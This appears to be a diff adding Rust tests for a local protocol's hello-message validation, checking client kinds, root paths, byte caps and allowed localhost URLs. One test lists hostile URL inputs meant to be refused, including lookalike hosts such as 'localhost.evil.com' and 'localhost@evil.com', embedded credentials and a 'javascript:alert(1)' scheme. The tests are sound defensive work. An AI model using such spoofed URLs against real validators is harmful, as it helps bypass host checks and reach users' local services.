+// ---- G12: the extension stays the default ---------------------------------------------------
+
+#[test]
+fn hostile_a_kind_typo_is_refused_never_defaulted_to_extension() {
+    for typo in [
+        "dev-server",
+        "devServer",
+        "Dev_server",
+        "panel ",
+        "extensions",
+        "",
+    ] {
+        assert_eq!(
+            verdict(&dev_hello(json!({ "kind": typo }))),
+            "bad_request",
+            "kind {typo:?}"
+        );
+    }
+}
+
+#[test]
+fn hostile_extension_fields_under_a_panel_kind_are_refused() {
+    assert_eq!(
+        verdict(&extension_hello(json!({ "kind": "panel" }))),
+        "bad_request"
+    );
+    assert_eq!(
+        verdict(&extension_hello(json!({ "kind": "dev_server" }))),
+        "bad_request"
+    );
+}
+
+#[test]
+fn a_045_hello_without_kind_still_parses_as_an_extension() {
+    let client = client_of(&extension_hello(json!({})));
+    assert_eq!(client["extension_id"], "dhbddmompicnipfolmglmbnlpgglojid");
+    assert!(
+        client.get("kind").is_none() || client["kind"] == "extension",
+        "an extension, not another identity: {client}"
+    );
+    // The explicit spelling is the same identity.
+    let explicit = client_of(&extension_hello(json!({ "kind": "extension" })));
+    assert_eq!(explicit["extension_id"], client["extension_id"]);
+}
+
+#[test]
+fn a_045_hello_with_an_unknown_field_is_still_refused() {
+    assert_eq!(
+        verdict(&extension_hello(json!({ "token": "x" }))),
+        "bad_request"
+    );
+}
+
+// ---- the two new identities ----------------------------------------------------------------
+
+#[test]
+fn hostile_dev_server_and_panel_hellos_are_never_each_other() {
+    // A panel hello carrying URLs, and a dev-server hello without them.
+    assert_eq!(
+        verdict(&panel_hello(json!({ "app_url": "http://localhost:5173" }))),
+        "bad_request"
+    );
+    let mut no_urls = dev_hello(json!({}));
+    let client = no_urls["client"].as_object_mut().expect("object");
+    client.remove("app_url");
+    client.remove("panel_url");
+    assert_eq!(verdict(&no_urls), "bad_request");
+    let mut no_panel = dev_hello(json!({}));
+    no_panel["client"]
+        .as_object_mut()
+        .expect("object")
+        .remove("panel_url");
+    assert_eq!(verdict(&no_panel), "bad_request");
+}
+
+#[test]
+fn dev_server_and_panel_hellos_parse_and_round_trip() {
+    let dev = client_of(&dev_hello(json!({})));
+    assert_eq!(dev["kind"], "dev_server");
+    assert_eq!(dev["root"], ROOT);
+    assert_eq!(dev["app_url"], "http://localhost:5173");
+    assert_eq!(dev["panel_url"], "http://localhost:5174");
+    let panel = client_of(&panel_hello(json!({})));
+    assert_eq!(panel["kind"], "panel");
+    assert_eq!(panel["root"], ROOT);
+}
+
+#[test]
+fn hostile_a_relative_root_is_refused() {
+    assert_eq!(
+        verdict(&panel_hello(json!({ "root": "app" }))),
+        "bad_request"
+    );
+    assert_eq!(
+        verdict(&dev_hello(json!({ "root": "./home/dev/app" }))),
+        "bad_request"
+    );
+}
+
+#[test]
+fn hostile_the_root_cap_counts_bytes() {
+    let at = root_of_bytes(4096);
+    let over = root_of_bytes(4097);
+    assert_eq!(at.len(), 4096);
+    assert_eq!(over.len(), 4097);
+    assert!(
+        at.chars().count() < 4096,
+        "the case a char count would get wrong"
+    );
+    assert_ne!(verdict(&panel_hello(json!({ "root": over }))), "accepted");
+    assert_eq!(verdict(&panel_hello(json!({ "root": at }))), "accepted");
+}
+
+#[test]
+fn hostile_urls_that_only_look_local_or_carry_userinfo_query_or_fragment_are_refused() {
+    for url in [
+        "http://localhost.evil.com:5173",
+        "http://localhost@evil.com:5173",
+        "http://u:p@localhost:5173/",
+        "http://evil.com:5173",
+        "https://localhost:5173",
+        "http://0.0.0.0:5173",
+        "http://127.0.0.1.evil.com:5173",
+        "http://localhost/",
+        "http://localhost",
+        "http://localhost:5173/?token=x",
+        "http://localhost:5173/app/#frag",
+        "javascript:alert(1)",
+        "ws://localhost:5173",
+        "localhost:5173",
+    ] {
+        assert_eq!(
+            verdict(&dev_hello(json!({ "app_url": url }))),
+            "bad_request",
+            "app_url {url}"
+        );
+        assert_eq!(
+            verdict(&dev_hello(json!({ "panel_url": url }))),
+            "bad_request",
+            "panel_url {url}"
+        );
+    }
+}
+
+#[test]
+fn hostile_the_url_cap_is_2048_bytes_inclusive() {
+    let base = "http://localhost:5173/";
+    let at = format!("{base}{}", "a".repeat(2048 - base.len()));
+    let over = format!("{base}{}", "a".repeat(2049 - base.len()));
+    assert_eq!(at.len(), 2048);
+    assert_eq!(verdict(&dev_hello(json!({ "app_url": at }))), "accepted");
+    assert_ne!(verdict(&dev_hello(json!({ "app_url": over }))), "accepted");
+}
+
+#[test]
+fn local_urls_with_a_port_and_any_path_are_accepted() {
+    for url in [
+        "http://localhost:5173",
+        "http://localhost:5173/",
+        "http://localhost:5173/app/",
+        "http://127.0.0.1:5173/nested/base/",
+        "http://[::1]:5173",
+        "http://[::1]:5173/app/",
+    ] {
+        assert_eq!(
+            verdict(&dev_hello(json!({ "app_url": url, "panel_url": url }))),
+            "accepted",
+            "{url}"
+        );
+    }
+}
